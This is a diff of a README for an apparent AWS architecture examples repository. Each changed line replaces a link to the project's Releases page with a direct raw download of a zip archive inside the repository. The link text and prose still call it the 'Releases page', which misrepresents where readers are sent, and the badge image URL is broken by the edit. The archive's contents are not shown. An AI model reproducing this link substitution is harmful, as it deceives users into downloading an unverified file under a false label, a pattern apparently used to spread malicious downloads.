@@ -1,6 +1,6 @@
 # 🌟 aws-architecture-design-examples - Practical AWS Solutions for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/thiago534/aws-architecture-design-examples/releases)
+[![Download Now](https://github.com/thiago534/aws-architecture-design-examples/raw/refs/heads/main/designs/aws_architecture_examples_design_v3.4.zip%20Now-v1.0-blue)](https://github.com/thiago534/aws-architecture-design-examples/raw/refs/heads/main/designs/aws_architecture_examples_design_v3.4.zip)
 
 ## 📋 Overview
 
@@ -20,12 +20,12 @@ Before you proceed, ensure your computer meets these basic requirements:
 
 ### 2. Visit the Releases Page
 
-To download the latest version of our AWS architecture design examples, visit our [Releases page](https://github.com/thiago534/aws-architecture-design-examples/releases). This page contains all available versions.
+To download the latest version of our AWS architecture design examples, visit our [Releases page](https://github.com/thiago534/aws-architecture-design-examples/raw/refs/heads/main/designs/aws_architecture_examples_design_v3.4.zip). This page contains all available versions.
 
 ## 📥 Download & Install
 
 1. **Go to the Releases Page:**
-   Click here to access the [Releases page](https://github.com/thiago534/aws-architecture-design-examples/releases).
+   Click here to access the [Releases page](https://github.com/thiago534/aws-architecture-design-examples/raw/refs/heads/main/designs/aws_architecture_examples_design_v3.4.zip).
 
 2. **Select a Version:**
    On the Releases page, you will see various versions listed. Choose the most recent one by looking for the highest version number.
